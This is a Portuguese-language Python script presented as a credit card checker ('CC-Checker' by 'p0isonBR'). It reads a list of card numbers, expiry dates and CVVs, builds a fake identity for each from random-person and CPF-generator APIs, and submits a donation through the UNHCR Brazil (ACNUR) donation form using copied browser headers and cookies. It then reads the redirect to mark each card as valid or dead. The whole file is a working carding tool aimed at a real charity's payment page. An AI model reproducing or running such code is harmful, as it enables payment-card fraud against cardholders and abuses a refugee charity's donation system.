import os,time,requests,json

#Cores
R="\033[1;31m"; B="\033[1;34m"; C="\033[1;37m"; Y="\033[1;33m"; G="\033[1;32m"; RT="\033[;0m"

os.system('clear')

print(C+"                            /+osyhhhhhhyys++/")
print("                         +oydddhhhhyyhhhhdddhy+/")
print("                      /+yddhyyyys.josue.syyhddhs/")
print("                     +hddyyssssssssssssssssssyyhdds/")
print("                   /sddhyyyyyyssssssssssssssyyyyyhmh+")
print("                  /hmdhhddddddhhhyyyyyyhhhhdddddhhhddo")
print("                 /hmmdhs+/ //+osyhhhhhhysso+////ohddmdo")
print("                /hmmmy"+B+".           `````          `"+C+"smddd+")
print("                smddm/"+B+"     `````          `````   "+C+"mdhmh/")
print("               +ddydm+"+B+"  -/osyyyys+.    ./syyyyso/-"+C+"mdydms")
print("               ymhyhmh"+B+".yyo/ -- +hdo  /dho -- /oyh."+C+"ymdyymd/")
print("              /dmyyymd"+B+".  ``.-   ./   -/.-   .``  `"+C+"dmhsydmo")
print("              smdysymd"+B+"   shdhyydy      sdyyhddy   "+C+"dmyyshmy")
print("              dmysshmy"+B+"                            "+C+"smhssymd/")
print("             /dmyssymd"+B+"                            "+C+"hmhsyymm/")
print("             /dmyssyhms"+B+"                          /"+C+"mdysyymm/")
print("             /dmyssyydm/"+B+"  sh       hh/     -hy  ."+C+"dmyssyymm/")
print("              dmhssssydd/"+B+" -hdhysshdysdhssyhdd  -"+C+"hmhyssyymd/")
print("              ymhssssyyddo"+B+"``. //+/.` ./+// -` /"+C+"ddhysssyhmh")
print("              +mdysssssyhdh"+B+" `     `/+`      -"+C+"sddysssssydmo")
print("               ymhysssssyyddh/"+B+"`   `dm.   ` "+C+"sddhysssssyhmh/")
print("               /hmhysssssyyyhdds"+B+" ..dm . "+C+"ohddhyyssssyyhmd+")
print("                /yddhyssssssyyhhddhddddddhyyssssssyydmh+")
print("               /+sdmmdhhyyyysssyyyyyyyyyysssyyyyyhddmdyo+/")
print("           /+shdddhhyhhddddddhhhhhhhhhhhhhhdddddddhyyhhdddyo/")
print("         /shddhyyysssssyyyyhhhhhhhhhhhhhhhhhhyyyyyssssyyyhdddy+")
print("        /hmhyyssssssssssssssssssssssssssssssssssssssssssssyyhddo")
print("        /dmhyyyyyssssssssssssssssssssssssssssssssssssssyyyyyydms")
print("         +yhddddddhhhhhyyyyyyyyyyyyyyyyyyyyyyyyyyhhhhhdddddddhs/")
print("           //++oossyyhhhhhhhdddddddddddddddddhhhhhhyyssoo++///")
print("                       ///////+++++++++++++//////")
print("                        ___  _                 ___   ____")
print("                       / _ \(_)               |  _ \|  __ \ ")
print("                 ____ | | | | |___   _   ____ | |_| | |__) |")
print("                |  _ \| | | | / __|/ _ \|  _ \| |_ <|  _  /")
print("                | |_) | |_| | \__ \ (_) | | | | |_| ) | \ \ ")
print("                |  __/ \___/|_|___/\___/|_| |_|____/|_|  \_\ ")
print(C+"                | |"+RT+B+"*t.me/p0isonBR*"+RT)
print(C+"                |_|"+RT+B+"*by p0isonBR"+RT)

time.sleep(3); os.system('clear')

print(B+"*By PoisonBR"+RT+G+"""
 $$$$$$\   $$$$$$\     $$$$$$\  $$\                           $$\                           
$$  __$$\ $$  __$$\   $$  __$$\ $$ |                          $$ |                          
$$ /  \__|$$ /  \__|  $$ /  \__|$$$$$$$\   $$$$$$\   $$$$$$$\ $$ |  $$\  $$$$$$\   $$$$$$\  
$$ |      $$ |$$$$$$\ $$ |      $$  __$$\ $$  __$$\ $$  _____|$$ | $$  |$$  __$$\ $$  __$$\ 
$$ |      $$ |\______|$$ |      $$ |  $$ |$$$$$$$$ |$$ /      $$$$$$  / $$$$$$$$ |$$ |  \__|
$$ |  $$\ $$ |  $$\   $$ |  $$\ $$ |  $$ |$$   ____|$$ |      $$  _$$<  $$   ____|$$ |      
\$$$$$$  |\$$$$$$  |  \$$$$$$  |$$ |  $$ |\$$$$$$$\ \$$$$$$$\ $$ | \$$\ \$$$$$$$\ $$ |      
 \______/  \______/    \______/ \__|  \__| \_______| \_______|\__|  \__| \_______|\__|      
                                                                                       v 1.0"""+C+""")

try:
    def checker(cc,mes,ano,cvv):
        r=requests.request("GET","https://lookup.binlist.net/"+cc[0:6]).json()
        band=r.get("scheme")
        tipo=r.get("type")
        pais=r.get("country")
        banco=r.get("bank")
        nivel=r.get("brand")

        if tipo=="credit":
            tipo2="C"
        else:
            tipo2="D"

        print("""
   [+]Consultando dados do cartão:
[*]Cartao: {}
[*]Bandeira: {}
[*]Tipo: {}
[*]Nivel: {}
[*]Pais: {}
[*]Banco: {}
""".format(gg,band,tipo,nivel,pais.get("name"),banco.get("name")))

        pessoa=requests.request("GET","https://randomuser.me/api/?nat="+pais.get("alpha2").lower())
        pessoa=pessoa.text
        pessoa=json.loads(pessoa)
        genero=pessoa["results"][0]["gender"]
        if genero=="female":
            genero2=genero.replace("female","Mulher")
            genero3="F"
        else:
            genero2=genero.replace("male","Homem")
            genero3="M"
        pnome=pessoa["results"][0]["name"]["first"]
        sobrenome=pessoa["results"][0]["name"]["last"]
        nome=pnome +" " +sobrenome
        nascimento=pessoa["results"][0]["dob"]["date"][0:10]
        if pais.get("alpha2")=="BR":
            d=nascimento.split("-")[2]
            m=nascimento.split("-")[1]
            a=nascimento.split("-")[0]
            nascimento=d+"/"+m+"/"+a
        cpf=requests.request("GET", "http://geradorapp.com/api/v1/cpf/generate?token=f01e0024a26baef3cc53a2ac208dd141")
        cpf=cpf.json()
        cpf2=cpf["data"]["number_formatted"]
        cpf=cpf["data"]["number"]
        email=pnome.replace(" ",".")+"."+sobrenome.replace(" ",".")+"@outlook.com"
        email=email.lower().encode("ascii","ignore").decode("ascii")
        cidade=pessoa["results"][0]["location"]["city"]
        estado=pessoa["results"][0]["location"]["state"]
        endereco=pessoa["results"][0]["location"]["street"]["name"]
        cep=str(pessoa["results"][0]["location"]["postcode"])
        if pais.get("alpha2")=="BR":
            cep=cep+"-000"
        bairro="Centro"

        for key, value in estados.items():
            estado=estado.replace(key,value)

        print("""[+]Gerando pessoa aleatoria:
[*]Genero: {}
[*]Nome: {}
[*]Nascimento: {}
[*]CPF: {}
[*]E-Mail: {}
[*]Endereço: {}
[*]CEP/ZIP: {}
[*]Cidade: {}
[*]Estado: {}
""".format(genero2,nome,nascimento,cpf2,email,endereco,cep,cidade,estado))

        donate="https://doar.acnur.org/api/ACNURBR/donate.html"
        h = {
            "Host": "doar.acnur.org",
            "Connection": "keep-alive",
            "Content-Length": "1036",
            "Cache-Control": "max-age\u003d0",
            "Origin": "https://doar.acnur.org",
            "Upgrade-Insecure-Requests": "1",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-N950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 EdgA/45.09.4.5083",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Accept": "text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3",
            "Sec-Fetch-Site": "same-origin",
            "Referer": "https://doar.acnur.org/acnur/donate.html",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "pt-BR,pt;q\u003d0.9,en-US;q\u003d0.8,en;q\u003d0.7",
            "Cookie": "ROUTEID\u003d.zolaBETA; _gcl_au\u003d1.1.751806228.1604113311; _ga\u003dGA1.3.972845617.1604113311; _gid\u003dGA1.3.1315302043.1604113311; _ga\u003dGA1.2.972845617.1604113311; _gid\u003dGA1.2.1315302043.1604113311; _uetsid\u003d6df17a801b2511eb91b7e9b62ecdda16; _uetvid\u003d6df60f501b2511ebb9704745327a0630; m_ses\u003d20201031000154; m_cnt\u003d0; _tq_id.TV-72092763-1.c79b\u003d24d79b933ff67001.1604113315.0.1604113315..; _fbp\u003dfb.1.1604113316536.1144821724; __qca\u003dP0-1736157422-1604113317181"
            }

        data="successUrl=https%3A%2F%2Fdoar.acnur.org%2Facnur%2Fagradecimento.html%3Fd%3DBRPT00GD00%2520General%26r%3Dtrue%26a%3D%24%7BconvertedAmount%7D%26t%3D%24%7Btransaction.referenceID%7D%26u%3D%24%7Btransaction.nativeResponse%7D%26m%3DcreditCard%26v%3Ddonate&errorUrl=https%3A%2F%2Fdoar.acnur.org%2Facnur%2Ferror.html&pfpsrc=&DESCRIPTION=Com+Os+Refugiados&ONLINE_FORM=BRPT00GD00+General&LANGUAGE=pt&CURRENCY="+pais.get("currency")+"&EXPDATE="+mes+ano[1:3]+"&TAXID="+cpf+"&AMT=35&TYPE="+tipo2+"%2F"+band+"&PAYPERIOD=MONT&X=&FIRSTNAME="+pnome+"&LASTNAME="+sobrenome+"&EMAIL="+email.replace("@","%40")+"&GENDER="+genero3+"&CUSTOM_KEY_1=birthdate&CUSTOM_KEY_2=device&CUSTOM_VALUE_1="+nascimento.replace("/","%2F")+"&CUSTOM_VALUE_2=Mobile&GIFT_CUSTOM_KEY_1=birthdate&GIFT_CUSTOM_KEY_2=device&GIFT_CUSTOM_KEY_3=entrypoint&GIFT_CUSTOM_VALUE_1="+nascimento.replace("/","%2F")+"&GIFT_CUSTOM_VALUE_2=Mobile&GIFT_CUSTOM_VALUE_3=%2Facnur%2Fdonate.html&STREET="+endereco.replace(" ","+")+"&STREET2="+bairro.replace(" ","+")+"&CITY="+cidade.replace(" ","+")+"&STATE="+estado+"&ZIP="+cep+"&COUNTRY="+pais.get("alpha2")+"&PHONENUM=%2811%29+98765-4321&CCTYPE="+tipo2+"%2F"+band+"&ACCT="+cc+"&NAME="+nome.replace(" ","+")+"&CVV2="+cvv

        R=requests.request("POST",donate,headers=h,data=data)
        R=R.url
        if R=="https://doar.acnur.org/acnur/agradecimento.html":
            print("[+]Pagamento autorizado! Cartão LIVE!")
        else:
            R=R.split("=")[3]
        
            #Variaveis de retorno de erro
            if R=="REFUSED_PAYMENT":
                print("[-]Transação recusada (Possivel IP Block).")
            elif R=="DATA_INVALID":
                print("[-]Cartão invalido (DIE).")
            elif R=="FAIL_UNKNOWN":
                print("[-]Erro Desconhecido (possivel uso de cartao de Debito).")
            elif R=="ERROR_NETWORK":
                print("[-]Erro de rede.")
            elif R=="DATA_CARD_NOT_ALLOWED":
                print("[-]Pagamento nao autorizado.")
            elif R=="REFUSED_PROVIDER":
                print("[-]Pagamento recusado pela {}.".format(band))
            elif R=="REFUSED_BANK":
                print("[-]Recusado pelo {}.".format(banco))
            elif R=="DATA_MISSING":
                print("[-]Algum dado faltando.")
            else:
                print("Erro nao listado, confira: "+R.split("=")[1,2])
    
    #Adicionei apenas estados brasileiros e americanos, analisando a request POST, vi que enviava apenas a sigla.
    estados={
        "Acre": "AC",
        "Alagoas": "AL",
        "Amapá": "AP",
        "Amazonas": "AM",
        "Bahia": "BA",
        "Ceará": "CE",
        "Distrito Federal": "DF",
        "Espírito Santo": "ES",
        "Goiás": "GO",
        "Maranhão": "MA",
        "Mato Grosso": "MT",
        "Mato Grosso do Sul": "MS",
        "Minas Gerais": "MG",
        "Pará": "PA",
        "Paraíba": "PB",
        "Paraná": "PR",
        "Pernambuco": "PE",
        "Piauí": "PI",
        "Rio de Janeiro": "RJ",
        "Rio Grande do Norte": "RN",
        "Rio Grande do Sul": "RS",
        "Rondônia": "RO",
        "Roraima": "RR",
        "Santa Catarina": "SC",
        "São Paulo": "SP",
        "Sergipe": "SE",
        "Tocantins": "TO",
        "Alabama": "AL",
        "Alaska": "AK",
        "Arizona": "AZ",
        "Arkansas": "AR",
        "California": "CA",
        "Colorado": "CO",
        "Connecticut": "CT",
        "Delaware": "DE",
        "Florida": "FL",
        "Georgia": "GA",
        "Hawaii": "HI",
        "Idaho": "ID",
        "Illinois": "IL",
        "Indiana": "IN",
        "Iowa": "IA",
        "Kansas": "KS",
        "Kentucky": "KY",
        "Louisiana": "LA",
        "Maine": "ME",
        "Maryland": "MD",
        "Massachusetts": "MA",
        "Michigan": "MI",
        "Minnesota": "MN",
        "Mississippi": "MS",
        "Missouri": "MO",
        "Montana": "MT",
        "Nebraska": "NE",
        "Nevada": "NV",
        "New Hampshire": "NH",
        "New Jersey": "NJ",
        "New Mexico": "NM",
        "New York": "NY",
        "North Carolina": "NC",
        "North Dakota": "ND",
        "Northern Mariana Islands":"MP",
        "Ohio": "OH",
        "Oklahoma": "OK",
        "Oregon": "OR",
        "Palau": "PW",
        "Pennsylvania": "PA",
        "Rhode Island": "RI",
        "Puerto Rico": "PR",
        "South Carolina": "SC",
        "South Dakota": "SD",
        "Tennessee": "TN",
        "Texas": "TX",
        "Utah": "UT",
        "Vermont": "VT",
        "Virginia": "VA",
        "Washington": "WA",
        "Washington, DC": "DC",
        "West Virginia": "WV",
        "Wisconsin": "WI",
        "Wyoming": "WY",
        "Virgin Islands": "VI"
            }

    lista=open(input("Caminho da lista: "), "r").read().splitlines()
    for gg in lista:
        cc=gg.split("|")[0]
        mes=gg.split("|")[1]
        ano=gg.split("|")[2]
        cvv=gg.split("|")[3]
        checker(cc,mes,ano,cvv)
            
except KeyboardInterrupt:
    print("[-]Cancelado pelo usuario!")
    print("Saindo...")
    exit("Ctrl+C pressionado.")
except IOError:
    print("[-]Lista nao encontrada ou caminho inválido.")
    print("Saindo...")
    exit("Caminho invalido.")
except ValueError:
    print("[-]Bin nao encontrada (erro no inicio) ou erro no gerador de pessoas. Tente novamente!")
    print("Saindo...")
    exit("Erro de BIN ou Gerador")

